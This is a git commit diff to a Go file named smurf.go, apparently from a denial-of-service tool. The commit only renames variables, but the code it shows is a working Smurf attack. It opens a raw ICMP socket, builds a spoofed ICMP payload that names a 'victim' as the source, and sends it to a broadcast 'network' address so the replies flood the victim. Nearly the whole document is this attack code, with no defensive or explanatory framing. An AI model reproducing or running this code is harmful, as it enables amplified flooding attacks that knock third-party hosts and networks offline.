25c0bd08f0b31e26c6c9aa9ad761cf14f7602e98
Adriano Sela Aviles <adriano.selaviles@gmail.com>
2020-04-22 16:56:24 -0700

    Update smurf.go

--- smurf.go
+++ smurf.go
@@ -9,31 +9,31 @@ import (
 
 type smurf struct {
 	sockfd  int
-	slaves  *syscall.SockaddrInet4 // ICMP6 currently not supported
+	network  *syscall.SockaddrInet4
 	payload []byte
 }
 
-func newSmurf(target, slaves net.IP) (*smurf, error) {
+func newSmurf(victim, network net.IP) (*smurf, error) {
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
 	if err != nil {
 		return nil, errors.Wrap(err, "could not get raw icmp socket")
 	}
 
 	var remote syscall.SockaddrInet4
-	copy(remote.Addr[:], slaves.To4())
+	copy(remote.Addr[:], network.To4())
 
-	pl, err := spoofedICMP(target, slaves)
+	pl, err := spoofedICMP(victim, network)
 	if err != nil {
 		return nil, errors.Wrap(err, "could not build a spoofed payload")
 	}
 
 	return &smurf{
 		sockfd:  fd,
-		slaves:  &remote,
+		network:  &remote,
 		payload: pl,
 	}, nil
 }
 
 func (s *smurf) execute() error {
-	return syscall.Sendto(s.sockfd, s.payload, 0, s.slaves)
+	return syscall.Sendto(s.sockfd, s.payload, 0, s.network)
 }
